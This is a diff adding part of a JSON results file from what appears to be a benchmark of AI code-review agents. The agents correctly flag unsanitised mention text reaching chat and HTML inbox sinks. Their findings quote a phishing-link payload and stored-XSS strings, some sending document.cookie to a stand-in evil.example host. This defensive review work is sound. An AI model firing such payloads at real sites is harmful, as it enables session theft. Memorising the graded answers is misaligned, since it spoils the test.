+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "sanitize*"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 15,
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because chat text is rendered as markup, `mentionChat` lets a comment body such as `<https://evil.example|Reset password>` become a phishing link sent from our bot and `<!channel>` mass-ping the channel. Wrap both `m.authorName` and `m.body` in `stripInlineMarkup` before passing them to `ChatClient.post`, as `mentionEmail` already does."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `clients.ts` documents that `InboxStore.add`'s `html` is rendered as is in the web app's notification inbox, raw `m.authorName` and `m.body` can execute stored XSS such as `<img src=x onerror=...>` or `<script>` in the recipient's authenticated session. Pass both fields through `stripInlineMarkup` before building the `html` string."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 83947,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes the raw m.authorName and m.body into the html field of InboxStore.add, which clients.ts:11-12 documents as rendered as is in the web app's notification inbox. WHY: an author name or body carrying HTML/script (e.g. <img src=x onerror=...>) is stored and executed when the recipient opens the notification inbox — stored XSS against every viewer of the inbox item. HOW: pass both values through stripInlineMarkup before building the html, mirroring mentionEmail:\n  html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/mentions.ts:26-31 interpolates m.authorName and m.body directly into the html field, and src/notifications/clients.ts:11-12 explicitly documents html as \"rendered as is in the web app's notification inbox\" — so attacker-controlled comment markup becomes stored HTML/script for every inbox viewer. The parallel mentionEmail sink (lines 15-16) already routes both values through stripInlineMarkup, proving the sanitizer is the intended defense and that the inbox path was simply missed. This is a distinct sink (InboxStore.add) from the earlier decision's email subject/body sink, so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the raw m.authorName and m.body into ChatClient.post's text, which clients.ts:7-8 documents as rendering chat markup (<url|label> links, <!channel> pings). WHY: a comment containing '<https://evil.example|Reset password>' renders as a live phishing link sent from our workspace and '<!channel>' pings the entire channel — the same untrusted-input-to-sink failure the email path was fixed for. HOW: pass both values through stripInlineMarkup before building the text, mirroring mentionEmail:\n  text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`",
+          "keep": true,
+          "rationale": "Verified: mentionChat at mentions.ts:22 interpolates raw m.authorName and m.body into chat.post's text, which clients.ts:7-8 documents as rendering chat markup (<url|label> links, <!channel> pings). Untrusted comment content like '<!channel>' or a phishing link is rendered live, matching the described failure path. This is a distinct sink/operation from the email path already fixed (PreviousDecision 1 covered mentionEmail); the same class of problem in a separate function is not a repeat of that entry. No guard sanitizes these values before the sink.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox writes the raw m.authorName and m.body into the inbox item's html, which InboxStore.add documents as \"rendered as is in the web app's notification inbox.\" WHY: a mention body like `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes in the recipient's session — stored XSS against the notified user. HOW: pass both values through stripInlineMarkup before interpolating, matching mentionEmail and the sanitize.ts contract.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox (mentions.ts:28) interpolates raw m.authorName and m.body into the inbox item's html, while the parallel sink mentionEmail (lines 15-16) applies stripInlineMarkup. sanitize.ts documents the contract that \"Every outbound sink passes user text through stripInlineMarkup first,\" and clients.ts:11 documents that InboxStore html is \"rendered as is in the web app's notification inbox.\" User-controlled comment text therefore lands unsanitized in a rendered HTML sink — a stored XSS path. This is a DIFFERENT sink than the one addressed by PreviousDecision #1, which only covered mentionEmail's subject/body; the inbox path was not touched by that fix.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "rendered as is|InboxStore|interface InboxStore",
+                "path": "src/notifications"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat writes the raw m.authorName and m.body into chat text that renders markup, unlike mentionEmail which passes both through stripInlineMarkup. WHY: a comment body containing `<!channel>` mass-pings the whole channel and `<https://evil.example|Reset password>` renders as a live link from our app — the same phishing vector the email sink was fixed for, now reachable through a new sink. HOW: wrap both values with stripInlineMarkup, matching mentionEmail and the contract documented in sanitize.ts.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (line 22) writes raw m.authorName and m.body into chat text, while mentionEmail (lines 15-16) passes both through stripInlineMarkup, and sanitize.ts documents the contract that every outbound sink must strip user text. The chat sink renders Slack-style markup, so <!channel> mass-pings and <url|text> renders a live phishing link — the exact vector sanitize.ts warns about. This is a different operation (chat vs email) than PreviousDecision index 1, which was scoped to mentionEmail's HTML/subject, so it is not a repeat of that entry.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 22,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 4,
+        "after": 4
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A comment body containing `<!channel>` mass-pings the whole channel and `<https://evil.example|Reset password>` renders as a live link from our app — the same phishing vector the email sink was fixed for, now reachable through a new sink. Wrap both values with `stripInlineMarkup`, matching `mentionEmail` and the contract documented in `sanitize.ts`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A mention body like `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes in the recipient's session, giving stored XSS against the notified user. Pass both values through `stripInlineMarkup` before interpolating, matching `mentionEmail` and the `sanitize.ts` contract."
+        },
+        {
+          "sourceIndex": 2,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A comment containing `<https://evil.example|Reset password>` renders as a live phishing link sent from our workspace and `<!channel>` pings the entire channel, the same untrusted-input-to-sink failure the email path was fixed for. Pass both values through `stripInlineMarkup` before building the text, mirroring `mentionEmail`."
+        },
+        {
+          "sourceIndex": 3,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "An author name or body carrying HTML/script (e.g. `<img src=x onerror=...>`) is stored and executed when the recipient opens the notification inbox, giving stored XSS against every viewer of the inbox item. Pass both values through `stripInlineMarkup` before building the `html`, mirroring `mentionEmail`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 85520,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates m.authorName and m.body into the inbox `html` sink without going through stripInlineMarkup. WHY: InboxStore.add documents `html` as 'rendered as is in the web app's notification inbox', so a comment body like `<img src=x onerror=...>` (or a display name containing markup) executes as stored XSS in the app origin — the same vulnerability the previous round fixed for mentionEmail, and sanitize.ts states every outbound sink must sanitize. HOW: wrap both values: `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox interpolates m.authorName and m.body directly into the `html` sink, while InboxStore.add documents `html` as 'rendered as is in the web app's notification inbox' (clients.ts:11). sanitize.ts explicitly states every outbound sink must pass user text through stripInlineMarkup, and the sibling mentionEmail already sanitizes both values. The omission here is a concrete stored-XSS path (e.g. body/display name containing <img src=x onerror=...>). This is a distinct sink from the previously-fixed mentionEmail (round-a-P37), so it is not a repeat of that decision.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 50
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "add\\(|html|rendered as is",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into chat `text` without stripInlineMarkup. WHY: ChatClient.post documents `text` as chat markup where `<url|label>` renders a link and `<!channel>` pings everyone, so a comment body containing `<!channel>` triggers a mass ping and `<https://evil.example|Reset password>` renders a phishing link in chat — the same markup-injection class the previous round fixed for mentionEmail. HOW: wrap both values: `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/clients.ts:6 documents that ChatClient `text` uses chat markup where `<url|label>` renders a link and `<!channel>` pings everyone. src/notifications/mentions.ts:22 interpolates raw m.authorName and m.body into that text, while mentionEmail (lines 15-16) applies stripInlineMarkup. So an attacker-controlled comment body containing `<!channel>` or `<https://evil.example|Reset password>` reaches the chat sink unsanitized, causing mass ping / phishing-link injection. This is a different sink (chat) than the previous round's decision (email at lines 15-16), so it is not a repeat. The claim is factually correct and the failure path is reachable.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "post",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 20,
+                "path": "src/notifications/clients.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "The new mentionChat and mentionInbox sinks interpolate user-controlled authorName and body without sanitization. stripInlineMarkup (src/notifications/sanitize.ts:4-6) is already used in mentionEmail; pass both fields through it before building the inbox html and chat text, since InboxStore.add renders html as-is in the web app and ChatClient.post renders chat markup where `<url|label>` becomes a link, making this a real XSS/chat-markup injection vector.",
+          "keep": true,
+          "rationale": "Confirmed: src/notifications/mentions.ts lines 22 and 28 interpolate m.authorName and m.body raw into chat text and inbox html, while mentionEmail (lines 15-16) applies stripInlineMarkup. sanitize.ts exists and documents exactly these risks (HTML tags, <url|label> chat links, <!channel>). The previous decision (index 1) only addressed mentionEmail's subject/body; the mentionChat/mentionInbox sinks are a separate operation and a fresh omission, so this is not a repeat. The claimed XSS/chat-markup injection vector is technically real and the fix is coherent.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 17,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 3,
+        "after": 3
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "`InboxStore.add` renders `html` as-is in the web app's notification inbox, so interpolating `m.authorName` and `m.body` without `stripInlineMarkup` lets a comment body such as `<img src=x onerror=...>` or a display name containing markup execute as stored XSS in the app origin—the same vulnerability fixed for `mentionEmail`, and `sanitize.ts` requires every outbound sink to sanitize. Wrap both values with `stripInlineMarkup` when building the `html` field."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "`mentionChat` interpolates `m.authorName` and `m.body` into chat `text` without `stripInlineMarkup`, and since `ChatClient.post` renders chat markup where `<url|label>` becomes a link and `<!channel>` pings everyone, a comment body containing `<!channel>` triggers a mass ping and `<https://evil.example|Reset password>` renders a phishing link—the same markup-injection class fixed for `mentionEmail`. Wrap both values with `stripInlineMarkup` before building the `text` field."
+        },
+        {
+          "sourceIndex": 2,
+          "file": "src/notifications/mentions.ts",
+          "line": 15,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "The new `mentionChat` and `mentionInbox` sinks interpolate user-controlled `authorName` and `body` without sanitization; `stripInlineMarkup` (`src/notifications/sanitize.ts:4-6`) is already used in `mentionEmail`, and `InboxStore.add` renders `html` as-is while `ChatClient.post` renders chat markup where `<url|label>` becomes a link, making this a real XSS/chat-markup injection vector. Pass both fields through `stripInlineMarkup` before building the inbox `html` and chat `text`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 53467,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the raw m.authorName and m.body into the chat message text without stripInlineMarkup, while ChatClient.post documents that `text` renders chat markup (<url|label> becomes a link, <!channel> pings everyone).\nWHY: a comment body such as '<!channel>' notifies the entire channel, and '<https://evil.example|Reset password>' renders as a live clickable link in a message sent by our bot — the same phishing/mass-ping vector that stripInlineMarkup was added to close for email, left open in this new sink.\nHOW: pass both fields through stripInlineMarkup before building the message text, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed. mentionChat (src/notifications/mentions.ts:22) interpolates m.authorName and m.body raw into chat.post, while clients.ts:6-7 documents that chat `text` interprets markup (<url|label> renders a link, <!channel> pings everyone). sanitize.ts explicitly states the sanitizer exists precisely to close this vector for every outbound sink, yet mentionChat — the newly added sink — does not apply it, unlike the adjacent mentionEmail. The phishing/mass-ping path is real. Note: the earlier review entry (round-a-P37-markup-strip-new-sinks) covered mentionEmail only; this is a different sink/operation, so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "post|renders chat markup|<!channel>|<url\\|label>",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the raw m.authorName and m.body into an HTML string that InboxStore.add documents as being rendered as-is in the web app's notification inbox.\nWHY: a mention body containing HTML such as `<img src=x onerror=fetch('https://evil.example/'+document.cookie)>` is stored and rendered unescaped, giving a stored XSS in the notification inbox to anyone who can post a comment that mentions a user.\nHOW: run both fields through stripInlineMarkup before building the html, e.g. `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: line 28 interpolates raw m.authorName and m.body into an HTML string. clients.ts documents InboxStore.add's html as \"rendered as is in the web app's notification inbox\", so a mention body with HTML/event handlers becomes stored XSS. stripInlineMarkup is already imported and used in the sibling mentionEmail sink (line 16), proving the sanitizer exists and is the intended mitigation. The prior decision (index 1) was scoped specifically to mentionEmail (lines 15-16); this is a distinct sink/operation (the inbox), so it is not a repeat of that entry. Not refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "class InboxStore|html|add\\(",
+                "path": "src",
+                "glob": "*inbox*"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 16,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 22,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A comment body such as `<!channel>` pings the whole channel, and `<https://evil.example|Reset password>` renders as a live clickable link in a message sent by our bot, the same phishing and mass-ping vector `stripInlineMarkup` was added to close for email. Pass both `m.authorName` and `m.body` through `stripInlineMarkup` before building the `text` field."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 28,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A mention body containing HTML such as `<img src=x onerror=...>` is stored and rendered unescaped, giving a stored XSS in the notification inbox to anyone who can post a comment that mentions a user. Run both `m.authorName` and `m.body` through `stripInlineMarkup` before building the `html` string."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    }
+  ]
+}
